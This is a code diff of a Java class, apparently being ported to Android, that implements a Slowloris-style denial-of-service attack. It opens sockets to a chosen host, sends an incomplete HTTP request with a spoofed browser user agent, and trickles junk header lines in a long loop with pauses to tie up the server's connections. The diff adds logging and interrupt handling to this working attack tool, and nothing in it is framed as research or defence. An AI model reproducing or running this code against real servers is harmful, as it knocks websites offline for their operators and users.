@@ -8,6 +8,7 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import android.util.Log;
 
 public class Connection implements Runnable {
     private String hostname;
@@ -27,7 +28,7 @@ public class Connection implements Runnable {
         try {
             socket = new Socket(InetAddress.getByName(hostname), port);
             writer = new BufferedWriter(new OutputStreamWriter(
-                    socket.getOutputStream(), "UTF-8")); // A writer used to output to the socket
+                    socket.getOutputStream(), "UTF-8"));
             writer.write("GET / HTTP/1.1\r\n");
             writer.write("Host: " + hostname + " \r\n");
             writer.write("User-agent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;" +
@@ -35,32 +36,28 @@ public class Connection implements Runnable {
                     "4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
             writer.write("Content-Length: 1000000\r\n");
             writer.write("Connection:close\r\n");
-            writer.write("X-a:\r\n");    // Custom header, contains junk
-            writer.flush();                // Flushes the writer, to ensure that the header is written to the socket
-
+            writer.write("X-a:\r\n");
+            writer.flush();
             for (int i = 0; i < 100000000; i++) {
-                writer.write("X-a:b\r\n");    // The continuation of the custom "header"
-                writer.flush();                // Flushes the writer to ensure the continuation data is written to the socket
+                if (Thread.interrupted()) break;
+                writer.write("X-a:b\r\n");
+                writer.flush();
                 try {
-                    Thread.sleep(interval);    // Forces this thread to wait, to make the connection last
+                    Thread.sleep(interval);
                 } catch (InterruptedException e) {
-                    System.out.println("Thread can't sleep");
+                    break;
                 }
             }
             writer.close();
             socket.close();
-            System.out.println("Thread finished");
         } catch (UnknownHostException e) {
-            System.out
-                    .println("Thread died! The hostname could not be resolved!");
+            Log.d("Error:", "Thread died! The hostname could not be resolved!");
             System.exit(0);
         } catch (ConnectException e) {
-            System.out
-                    .println("Thread died from connection error! Check that there is an HTTP server and the port is correct.");
+            Log.d("Error:", "Thread died from connection error! Check that there is an HTTP server and the port is correct.");
             System.exit(0);
         } catch (SocketException e) {
-            System.out
-                    .println("Thread had a socket error; attempting to rebuild.");
+            Log.d("Error:", "Thread had a socket error; attempting to rebuild.\n" + e.getMessage());
             try {
                 writer.close();
                 socket.close();
